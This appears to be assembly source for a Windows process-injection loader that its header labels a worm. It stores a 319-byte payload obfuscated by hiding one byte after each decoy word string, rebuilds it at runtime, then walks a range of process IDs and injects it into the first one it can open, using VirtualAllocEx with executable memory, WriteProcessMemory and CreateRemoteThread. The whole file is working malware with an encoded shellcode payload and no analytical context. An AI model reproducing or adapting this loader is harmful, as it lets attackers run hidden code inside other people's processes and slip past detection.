#!name##tester2
#!types##worm
#!info##for test
#!globalVar##COMPILER_NAME##MC_win64##Compiler name
#!globalVar##OS_EXEC##win##Target system executable
#!processWorm##BasicAsm
#!lang##asm

bits 64
default rel



extern printf
extern GetLastError
extern OpenProcess
extern CloseHandle
extern VirtualAllocEx
extern WriteProcessMemory
extern CreateRemoteThread
extern WaitForSingleObject
extern ExitProcess
    
section .data
    text_exit: db "Exit Program", 10, 0
    text_build_end: db "Build code complete", 10, 0
    text_start: db "------------ Start Injection -------------", 10, 0
    text_temp: db "output: %d", 10, 0
    text_exe: db "Execute Shellcode. Shellcode len: %d bytes", 10, 0
    text_op: db "Open process PID: %d", 10, 0
    text_cp: db "---------- CLOSE PROCESS ------------", 10, 0
    text_error: db "ERROR: %d", 10, 0
    text_am: db "Try allocate memory in process", 10, 0
    text_am_addr: db "Allocate memory addr: 0x%p", 10, 0
    text_wm: db "Try write memory in process", 10, 0
    text_wm_ok: db "Writing: %d bytes", 10, 0
    text_th: db "Create Thread", 10, 0
    
    var0: db "Ala", 10, 0x48, 0
    var1: db "Kota", 10, 0x31, 0
    var2: db "Kotaaaaaaaaaaaaa", 10, 0xc9, 0
    var3: db "Ma", 10, 0x48, 0
    var4: db "Ola", 10, 0x81, 0
    var5: db "Psa", 10, 0xe9, 0
    var6: db "Kota", 10, 0xdd, 0
    var7: db "Ala", 10, 0xff, 0
    var8: db "Psa", 10, 0xff, 0
    var9: db "Psa", 10, 0xff, 0
    var10: db "Kota", 10, 0x48, 0
    var11: db "Kota", 10, 0x8d, 0
    var12: db "Ala", 10, 0x05, 0
    var13: db "Kota", 10, 0xef, 0
    var14: db "Psa", 10, 0xff, 0
    var15: db "Ma", 10, 0xff, 0
    var16: db "Ola", 10, 0xff, 0
    var17: db "Ma", 10, 0x48, 0
    var18: db "Psa", 10, 0xbb, 0
    var19: db "Ala", 10, 0xbf, 0
    var20: db "Ma", 10, 0xfa, 0
    var21: db "Kota", 10, 0x74, 0
    var22: db "Ola", 10, 0x77, 0
    var23: db "Kota", 10, 0xfc, 0
    var24: db "Kota", 10, 0xb3, 0
    var25: db "Kota", 10, 0x99, 0
    var26: db "Ala", 10, 0x94, 0
    var27: db "Ma", 10, 0x48, 0
    var28: db "Ala", 10, 0x31, 0
    var29: db "Psa", 10, 0x58, 0
    var30: db "Ala", 10, 0x27, 0
    var31: db "Kota", 10, 0x48, 0
    var32: db "Ala", 10, 0x2d, 0
    var33: db "Ola", 10, 0xf8, 0
    var34: db "Ala", 10, 0xff, 0
    var35: db "Ala", 10, 0xff, 0
    var36: db "Ala", 10, 0xff, 0
    var37: db "Ola", 10, 0xe2, 0
    var38: db "Ola", 10, 0xf4, 0
    var39: db "Ma", 10, 0x43, 0
    var40: db "Ma", 10, 0xb2, 0
    var41: db "Ala", 10, 0xf7, 0
    var42: db "Ala", 10, 0x93, 0
    var43: db "Ma", 10, 0x0c, 0
    var44: db "Ma", 10, 0x5b, 0
    var45: db "Kota", 10, 0x59, 0
    var46: db "Ala", 10, 0x94, 0
    var47: db "Kota", 10, 0xbf, 0
    var48: db "Ala", 10, 0xfa, 0
    var49: db "Ma", 10, 0x35, 0
    var50: db "Ala", 10, 0x26, 0
    var51: db "Kota", 10, 0xbd, 0
    var52: db "Psa", 10, 0xe3, 0
    var53: db "Kota", 10, 0xcb, 0
    var54: db "Ala", 10, 0xc5, 0
    var55: db "Kota", 10, 0xe9, 0
    var56: db "Psa", 10, 0xb2, 0
    var57: db "Ma", 10, 0x45, 0
    var58: db "Ma", 10, 0xa5, 0
    var59: db "Psa", 10, 0x99, 0
    var60: db "Kota", 10, 0xfb, 0
    var61: db "Ala", 10, 0x12, 0
    var62: db "Kota", 10, 0xc6, 0
    var63: db "Ma", 10, 0xdf, 0
    var64: db "Psa", 10, 0xb2, 0
    var65: db "Ola", 10, 0xff, 0
    var66: db "Ma", 10, 0x25, 0
    var67: db "Ola", 10, 0xe4, 0
    var68: db "Ala", 10, 0xfb, 0
    var69: db "Kota", 10, 0x12, 0
    var70: db "Kota", 10, 0xc6, 0
    var71: db "Ola", 10, 0x9f, 0
    var72: db "Ola", 10, 0xb2, 0
    var73: db "Ola", 10, 0xff, 0
    var74: db "Kota", 10, 0x05, 0
    var75: db "Ola", 10, 0xac, 0
    var76: db "Ola", 10, 0xfb, 0
    var77: db "Ma", 10, 0x96, 0
    var78: db "Psa", 10, 0x23, 0
    var79: db "Ala", 10, 0xf5, 0
    var80: db "Ala", 10, 0xb0, 0
    var81: db "Kota", 10, 0x39, 0
    var82: db "Kota", 10, 0x46, 0
    var83: db "Psa", 10, 0x35, 0
    var84: db "Ala", 10, 0xfb, 0
    var85: db "Ma", 10, 0xa8, 0
    var86: db "Kota", 10, 0x54, 0
    var87: db "Psa", 10, 0x13, 0
    var88: db "Ala", 10, 0xc6, 0
    var89: db "Ma", 10, 0x15, 0
    var90: db "Ma", 10, 0x0b, 0
    var91: db "Ma", 10, 0xfe, 0
    var92: db "Kota", 10, 0x9f, 0
    var93: db "Psa", 10, 0xb9, 0
    var94: db "Psa", 10, 0xd5, 0
    var95: db "Kota", 10, 0x7e, 0
    var96: db "Kota", 10, 0x33, 0
    var97: db "Ala", 10, 0x79, 0
    var98: db "Ma", 10, 0x36, 0
    var99: db "Ma", 10, 0xfd, 0
    var100: db "Psa", 10, 0x72, 0
    var101: db "Psa", 10, 0x7b, 0
    var102: db "Ola", 10, 0x79, 0
    var103: db "Ola", 10, 0xed, 0
    var104: db "Ala", 10, 0xbb, 0
    var105: db "Kota", 10, 0x25, 0
    var106: db "Psa", 10, 0x3f, 0
    var107: db "Ma", 10, 0x77, 0
    var108: db "Kota", 10, 0xe1, 0
    var109: db "Kota", 10, 0xb9, 0
    var110: db "Ola", 10, 0x1f, 0
    var111: db "Ola", 10, 0xfd, 0
    var112: db "Ola", 10, 0xc6, 0
    var113: db "Ala", 10, 0x3c, 0
    var114: db "Ola", 10, 0x76, 0
    var115: db "Ma", 10, 0x2c, 0
    var116: db "Ma", 10, 0x38, 0
    var117: db "Ala", 10, 0x19, 0
    var118: db "Ola", 10, 0x1c, 0
    var119: db "Ma", 10, 0xbf, 0
    var120: db "Kota", 10, 0xfa, 0
    var121: db "Psa", 10, 0x74, 0
    var122: db "Psa", 10, 0x3f, 0
    var123: db "Kota", 10, 0x79, 0
    var124: db "Ala", 10, 0x73, 0
    var125: db "Ma", 10, 0xed, 0
    var126: db "Kota", 10, 0xf3, 0
    var127: db "Kota", 10, 0xf7, 0
    var128: db "Ala", 10, 0xfb, 0
    var129: db "Kota", 10, 0xa4, 0
    var130: db "Ala", 10, 0x27, 0
    var131: db "Ala", 10, 0x77, 0
    var132: db "Ma", 10, 0xfb, 0
    var133: db "Ala", 10, 0x81, 0
    var134: db "Ala", 10, 0xd0, 0
    var135: db "Kota", 10, 0x34, 0
    var136: db "Ma", 10, 0xba, 0
    var137: db "Ola", 10, 0x54, 0
    var138: db "Psa", 10, 0x3e, 0
    var139: db "Kota", 10, 0xfd, 0
    var140: db "Ola", 10, 0x63, 0
    var141: db "Ola", 10, 0x7a, 0
    var142: db "Kota", 10, 0xc2, 0
    var143: db "Kota", 10, 0xf7, 0
    var144: db "Psa", 10, 0x05, 0
    var145: db "Psa", 10, 0xbd, 0
    var146: db "Ma", 10, 0x36, 0
    var147: db "Ma", 10, 0x77, 0
    var148: db "Ala", 10, 0x87, 0
    var149: db "Psa", 10, 0x11, 0
    var150: db "Kota", 10, 0xdc, 0
    var151: db "Ola", 10, 0xbe, 0
    var152: db "Psa", 10, 0x2c, 0
    var153: db "Psa", 10, 0x39, 0
    var154: db "Kota", 10, 0x46, 0
    var155: db "Kota", 10, 0x35, 0
    var156: db "Kota", 10, 0xfb, 0
    var157: db "Kota", 10, 0xa8, 0
    var158: db "Psa", 10, 0x54, 0
    var159: db "Psa", 10, 0x13, 0
    var160: db "Ola", 10, 0xbb, 0
    var161: db "Ma", 10, 0xb5, 0
    var162: db "Ma", 10, 0xbe, 0
    var163: db "Kota", 10, 0xf1, 0
    var164: db "Psa", 10, 0xf2, 0
    var165: db "Psa", 10, 0x98, 0
    var166: db "Ola", 10, 0x55, 0
    var167: db "Ola", 10, 0x87, 0
    var168: db "Ala", 10, 0x1a, 0
    var169: db "Ola", 10, 0x01, 0
    var170: db "Kota", 10, 0x86, 0
    var171: db "Ola", 10, 0xb0, 0
    var172: db "Kota", 10, 0xb0, 0
    var173: db "Psa", 10, 0xd5, 0
    var174: db "Kota", 10, 0xb0, 0
    var175: db "Ala", 10, 0xb7, 0
    var176: db "Ma", 10, 0xbf, 0
    var177: db "Ala", 10, 0x4d, 0
    var178: db "Psa", 10, 0xa6, 0
    var179: db "Kota", 10, 0x89, 0
    var180: db "Psa", 10, 0x6b, 0
    var181: db "Psa", 10, 0xc1, 0
    var182: db "Ala", 10, 0xd0, 0
    var183: db "Ma", 10, 0x34, 0
    var184: db "Psa", 10, 0xba, 0
    var185: db "Ala", 10, 0x50, 0
    var186: db "Kota", 10, 0x3e, 0
    var187: db "Psa", 10, 0xfd, 0
    var188: db "Ola", 10, 0x63, 0
    var189: db "Ma", 10, 0xff, 0
    var190: db "Ma", 10, 0xd5, 0
    var191: db "Ma", 10, 0x34, 0
    var192: db "Kota", 10, 0xf6, 0
    var193: db "Psa", 10, 0x3c, 0
    var194: db "Ma", 10, 0x33, 0
    var195: db "Ala", 10, 0x77, 0
    var196: db "Psa", 10, 0xf3, 0
    var197: db "Kota", 10, 0x85, 0
    var198: db "Ola", 10, 0xdd, 0
    var199: db "Kota", 10, 0xbe, 0
    var200: db "Kota", 10, 0x2a, 0
    var201: db "Kota", 10, 0x35, 0
    var202: db "Ala", 10, 0xfc, 0
    var203: db "Psa", 10, 0xf8, 0
    var204: db "Psa", 10, 0x3b, 0
    var205: db "Ola", 10, 0xd1, 0
    var206: db "Ma", 10, 0x95, 0
    var207: db "Ala", 10, 0x6f, 0
    var208: db "Ola", 10, 0xbb, 0
    var209: db "Ma", 10, 0x2c, 0
    var210: db "Ola", 10, 0x36, 0
    var211: db "Ala", 10, 0xa4, 0
    var212: db "Ala", 10, 0xed, 0
    var213: db "Ala", 10, 0xc0, 0
    var214: db "Kota", 10, 0xce, 0
    var215: db "Ma", 10, 0xfe, 0
    var216: db "Kota", 10, 0xa2, 0
    var217: db "Psa", 10, 0x35, 0
    var218: db "Ola", 10, 0x2e, 0
    var219: db "Ma", 10, 0xbd, 0
    var220: db "Kota", 10, 0xe9, 0
    var221: db "Ola", 10, 0xd1, 0
    var222: db "Ola", 10, 0x17, 0
    var223: db "Ala", 10, 0x53, 0
    var224: db "Ola", 10, 0xda, 0
    var225: db "Ala", 10, 0x35, 0
    var226: db "Kota", 10, 0x25, 0
    var227: db "Kota", 10, 0x03, 0
    var228: db "Ala", 10, 0x53, 0
    var229: db "Psa", 10, 0xc1, 0
    var230: db "Ola", 10, 0xd5, 0
    var231: db "Kota", 10, 0xe6, 0
    var232: db "Ala", 10, 0xa0, 0
    var233: db "Ala", 10, 0x3c, 0
    var234: db "Psa", 10, 0xfc, 0
    var235: db "Ala", 10, 0xee, 0
    var236: db "Psa", 10, 0x5a, 0
    var237: db "Psa", 10, 0xce, 0
    var238: db "Kota", 10, 0x6b, 0
    var239: db "Ola", 10, 0x40, 0
    var240: db "Ala", 10, 0x05, 0
    var241: db "Ala", 10, 0x29, 0
    var242: db "Ola", 10, 0x3f, 0
    var243: db "Ola", 10, 0x46, 0
    var244: db "Ola", 10, 0xb2, 0
    var245: db "Ola", 10, 0x99, 0
    var246: db "Ola", 10, 0x94, 0
    var247: db "Psa", 10, 0xbf, 0
    var248: db "Ma", 10, 0xfa, 0
    var249: db "Ala", 10, 0x74, 0
    var250: db "Ala", 10, 0x77, 0
    var251: db "Psa", 10, 0xfc, 0
    var252: db "Ala", 10, 0xfb, 0
    var253: db "Psa", 10, 0x14, 0
    var254: db "Kota", 10, 0x19, 0
    var255: db "Kota", 10, 0xbe, 0
    var256: db "Ala", 10, 0xfb, 0
    var257: db "Kota", 10, 0x74, 0
    var258: db "Psa", 10, 0x77, 0
    var259: db "Kota", 10, 0xbd, 0
    var260: db "Psa", 10, 0x09, 0
    var261: db "Psa", 10, 0xa8, 0
    var262: db "Ala", 10, 0x1f, 0
    var263: db "Ola", 10, 0xd0, 0
    var264: db "Psa", 10, 0x7d, 0
    var265: db "Ola", 10, 0x8b, 0
    var266: db "Ala", 10, 0xa2, 0
    var267: db "Ala", 10, 0x47, 0
    var268: db "Ola", 10, 0x43, 0
    var269: db "Psa", 10, 0x2c, 0
    var270: db "Kota", 10, 0x36, 0
    var271: db "Ma", 10, 0xe9, 0
    var272: db "Kota", 10, 0xbb, 0
    var273: db "Ola", 10, 0xce, 0
    var274: db "Ma", 10, 0xd1, 0
    var275: db "Ola", 10, 0x69, 0
    var276: db "Ola", 10, 0x0e, 0
    var277: db "Kota", 10, 0x04, 0
    var278: db "Ma", 10, 0x6b, 0
    var279: db "Kota", 10, 0x6a, 0
    var280: db "Psa", 10, 0xb2, 0
    var281: db "Ala", 10, 0xf7, 0
    var282: db "Ola", 10, 0xb3, 0
    var283: db "Ala", 10, 0xd4, 0
    var284: db "Ma", 10, 0x8f, 0
    var285: db "Ma", 10, 0x9f, 0
    var286: db "Ala", 10, 0xe8, 0
    var287: db "Ola", 10, 0xb5, 0
    var288: db "Psa", 10, 0x7a, 0
    var289: db "Ala", 10, 0x8f, 0
    var290: db "Ola", 10, 0x97, 0
    var291: db "Kota", 10, 0x89, 0
    var292: db "Kota", 10, 0xb6, 0
    var293: db "Ma", 10, 0x22, 0
    var294: db "Psa", 10, 0xd3, 0
    var295: db "Ma", 10, 0xac, 0
    var296: db "Psa", 10, 0x88, 0
    var297: db "Kota", 10, 0x1b, 0
    var298: db "Ala", 10, 0x1d, 0
    var299: db "Psa", 10, 0xfc, 0
    var300: db "Ola", 10, 0xea, 0
    var301: db "Kota", 10, 0xd8, 0
    var302: db "Psa", 10, 0x1d, 0
    var303: db "Psa", 10, 0x65, 0
    var304: db "Ola", 10, 0x05, 0
    var305: db "Kota", 10, 0xa1, 0
    var306: db "Psa", 10, 0x14, 0
    var307: db "Ola", 10, 0x9d, 0
    var308: db "Ma", 10, 0xdf, 0
    var309: db "Ala", 10, 0xfa, 0
    var310: db "Ma", 10, 0xba, 0
    var311: db "Psa", 10, 0xda, 0
    var312: db "Ola", 10, 0x82, 0
    var313: db "Kota", 10, 0x11, 0
    var314: db "Ala", 10, 0x77, 0
    var315: db "Kota", 10, 0xfc, 0
    var316: db "Ala", 10, 0xb3, 0
    var317: db "Kota", 10, 0x99, 0
    var318: db "Ma", 10, 0x94, 0
    
    
    var_data: dq var0, var1, var2, var3, var4, var5, var6, var7, var8, var9, var10, var11, var12, var13, var14, var15, var16, var17, var18, var19, var20, var21, var22, var23, var24, var25, var26, var27, var28, var29, var30, var31, var32, var33, var34, var35, var36, var37, var38, var39, var40, var41, var42, var43, var44, var45, var46, var47, var48, var49, var50, var51, var52, var53, var54, var55, var56, var57, var58, var59, var60, var61, var62, var63, var64, var65, var66, var67, var68, var69, var70, var71, var72, var73, var74, var75, var76, var77, var78, var79, var80, var81, var82, var83, var84, var85, var86, var87, var88, var89, var90, var91, var92, var93, var94, var95, var96, var97, var98, var99, var100, var101, var102, var103, var104, var105, var106, var107, var108, var109, var110, var111, var112, var113, var114, var115, var116, var117, var118, var119, var120, var121, var122, var123, var124, var125, var126, var127, var128, var129, var130, var131, var132, var133, var134, var135, var136, var137, var138, var139, var140, var141, var142, var143, var144, var145, var146, var147, var148, var149, var150, var151, var152, var153, var154, var155, var156, var157, var158, var159, var160, var161, var162, var163, var164, var165, var166, var167, var168, var169, var170, var171, var172, var173, var174, var175, var176, var177, var178, var179, var180, var181, var182, var183, var184, var185, var186, var187, var188, var189, var190, var191, var192, var193, var194, var195, var196, var197, var198, var199, var200, var201, var202, var203, var204, var205, var206, var207, var208, var209, var210, var211, var212, var213, var214, var215, var216, var217, var218, var219, var220, var221, var222, var223, var224, var225, var226, var227, var228, var229, var230, var231, var232, var233, var234, var235, var236, var237, var238, var239, var240, var241, var242, var243, var244, var245, var246, var247, var248, var249, var250, var251, var252, var253, var254, var255, var256, var257, var258, var259, var260, var261, var262, var263, var264, var265, var266, var267, var268, var269, var270, var271, var272, var273, var274, var275, var276, var277, var278, var279, var280, var281, var282, var283, var284, var285, var286, var287, var288, var289, var290, var291, var292, var293, var294, var295, var296, var297, var298, var299, var300, var301, var302, var303, var304, var305, var306, var307, var308, var309, var310, var311, var312, var313, var314, var315, var316, var317, var318
    var_limit: equ 319
    
    min_score: equ 1300
    max_score: equ 10100
    
section .bss
    spoint resq 1   ; shellcode index
    dpoint resq 1   ; data index
    scode resb 1024
    mem_pointer resq 1
    sc_addr resq 1
    
    target_player resq 1    ; process PID
    proc_handle resq 1  ;process handler
    mem_addr resq 1     ; memory address
    bytes_wr resq 1     ; counter write bytes
    
    

section .text
    global main

main:
    mov rbp, rsp; for correct debugging
    and rsp, -16
    mov rbp, rsp; for correct debugging
    call Build
    sub rsp, 32 ;shadow space
    mov rcx, text_start
    call printf
    add rsp, 32 ;restore stack
    
    
    call CheckPID
    call EXIT

CheckPID:
    lea rax, [target_player]
    mov qword [rax], min_score
    .cPID_loop:
        lea rcx, [target_player]
        mov rcx, [rcx]
        mov rbx, max_score
        cmp rcx, rbx
        je .cPID_end
        call Inject
        cmp rax, 1
        je .cPID_end
        
        lea rbx, [target_player]
        mov rax, [rbx]
        inc rax ; PID + 1
        mov [rbx], rax
        jmp .cPID_loop

    .cPID_end:
        ret

; IN : rcx - process PID
; OUT: rax - '1' success, '0' fail
Inject:
    call OpenProc
    cmp rax, 0
    je .IN_error
    call AllocMemory
    cmp rax, 0
    je .IN_error
    call WriteMem
    cmp rax, 0
    je .IN_error
    call CreateTH
    cmp rax, 0
    je .IN_error
    
    
    
    
    call CloseProc
    ; return success
    xor rax, rax
    inc rax
    ret
    
    .IN_error:
        call CloseProc
        xor rax, rax    ; return fail
        ret


CreateTH:
    sub rsp, 32 ;shadow space
    mov rcx, text_th
    call printf
    add rsp, 32 ;restore stack
    
    ;create thread
    sub rsp, 56 ; shadow space 32 bytes + 4 * args
    lea rcx, [proc_handle]
    mov rcx, [rcx]  ; [in] hProcess
    xor rdx, rdx  ;[in] lpThreadAttributes
    xor r8, r8   ;[in] dwStackSize
    lea r9, [mem_addr]
    mov r9, [r9]    ;[in] lpStartAddress
    mov qword [rsp+32], 0 ;[in] lpParameter
    mov qword [rsp+40], 0 ;[in] dwCreationFlags
    mov qword [rsp+48], 0 ;[out] lpThreadId
    call CreateRemoteThread
    add rsp, 56 ;restore stack
    cmp rax, 0
    je .cTH_error
    
    ;sub rsp, 32 ;shadow space
;    mov rcx, rax
;    mov rdx, 0xffffffff
;    call WaitForSingleObject
;    add rsp, 32 ;restore stack
    
    xor rax, rax
    inc rax ;return success
    ret
    
    .cTH_error:
        call ERROR
        xor rax, rax    ; return fail
        ret
    


WriteMem:
    sub rsp, 32 ;shadow space
    mov rcx, text_wm
    call printf
    add rsp, 32 ;restore stack
    
    ; write memory
    sub rsp, 48 ;shadow space
    lea rcx, [proc_handle]
    mov rcx, [rcx]
    lea rdx, [mem_addr]
    mov rdx, [rdx]
    lea r8, [scode] ; shellcode buffer addr

    mov r9, var_limit
    ; pointer to bytes_written
    lea rbx, [bytes_wr]
    mov qword [rsp + 32], rbx
    call WriteProcessMemory
    add rsp, 48 ;restore stack
    cmp rax, 0
    je .WM_error
    
    sub rsp, 32 ;shadow space
    mov rcx, text_wm_ok
    lea rdx, [bytes_wr]
    mov rdx, [rdx]
    call printf
    add rsp, 32 ;restore stack
    
    xor rax, rax
    inc rax ; return success
    ret
    
    .WM_error:
        call ERROR
        xor rax, rax    ; return fail
        ret
    
    
    
AllocMemory:
    
    sub rsp, 32 ;shadow space
    mov rcx, text_am
    call printf
    add rsp, 32  ; restore stack
    
    ; Allocate Memory
    sub rsp, 48 ; shadow space
    lea rbx, [proc_handle]
    mov rcx, [rbx]
    mov rdx, 0  ; lpAddress
    mov r8, var_limit
    mov r9, 0x00001000 | 0x00002000    ; flAllocationType = MEM_COMMIT | MEM_RESERVE
    mov qword [rsp + 32], 0x40  ; flProtect = PAGE_EXECUTE_READWRITE
    call VirtualAllocEx
    add rsp, 48 ; restore stack
    cmp rax, 0
    je .AM_error
    
    ; save memory addr
    lea rbx, [mem_addr]
    mov [rbx], rax
    
    sub rsp, 32 ; shadow space
    mov rcx, text_am_addr
    mov rdx, rax
    call printf
    add rsp, 32 ; restore stack
    
    xor rax, rax    ;return successs
    inc rax
    ret
    
    .AM_error:
        call ERROR
        xor rax, rax    ; return fail
        ret
        

; IN: rcx - process PID
; OUT: rax - '1' success, '0' fail
OpenProc:
    lea rbx, [target_player]
    mov [rbx], rcx
    
    sub rsp, 32 ;shadow space
    mov rcx, text_op
    mov rdx, [rbx]
    call printf
    add rsp, 32 ; restore stack
    
    
    ; open process
    lea rbx, [target_player]
 
    sub rsp, 32 ;shadow space
    mov rcx, 0x1F0FFF    ; PROCESS_ALL_ACCESS
    xor rdx, rdx
    mov r8, [rbx]
    call OpenProcess
    add rsp, 32 ; restore stack
    cmp rax, 0
    je .OP_error
    
    ; save process handle
    lea rbx, [proc_handle]
    mov [rbx], rax
    
    mov rax, 1  ; return success
    ret
    
    
    .OP_error:
        call ERROR
        xor rax, rax
        ret

CloseProc:
    sub rsp, 32 ;shadow space
    mov rcx, text_cp
    call printf
    add rsp, 32
    
    sub rsp, 32 ;shadow space
    lea rcx, [proc_handle]
    mov rcx, [rcx]
    call CloseHandle
    add rsp, 32 ;restore stack
    ret 

Build:
    .build_loop:
        lea rbx, [dpoint]
        mov rcx, [rbx]
        cmp rcx, var_limit
        je .build_end
        call CheckVar
        lea rbx, [dpoint]
        mov rcx, [rbx]
        inc rcx ; var index + 1
        mov [rbx], rcx
        jmp .build_loop
        

    .build_end:
        sub rsp, 32 ;shadow space
        mov rcx, text_build_end
        call printf
        add rsp, 32 ; restore stack
        
        ret

CheckVar:
    lea rbx, [var_data]
    mov rdx, [rbx + 8 * rcx]
    xor rax, rax
    xor rcx, rcx
    .cv_loop:
        mov al, [rdx + rcx]
        cmp al, 10
        je .cv_end
        inc rcx ; index + 1
        jmp .cv_loop

    .cv_end:
        inc rcx
        mov al, [rdx + rcx]
        lea rbx, [spoint]
        mov rbx, [rbx]
        lea rdx, [scode]
        mov [rdx + rbx], al ; save part shellcode
        inc rbx     ; shellcode index + 1
        lea rcx, [spoint]
        mov [rcx], rbx
        ret       

ERROR:
    sub rsp, 32 ;shadow space
    call GetLastError
    add rsp, 32 ; restore stack
    
    sub rsp, 32 ;shadow space
    mov rcx, text_error
    mov rdx, rax
    call printf
    add rsp, 32 ;restore stack
    cmp rax, 0
    je ERROR
    ret

EXIT:
    sub rsp, 32 ;shadow space
    mov rcx, text_exit
    call printf
    add rsp, 32 ; restore stack
    
    sub rsp, 32 ;shadow space
    mov rcx, 1
    call ExitProcess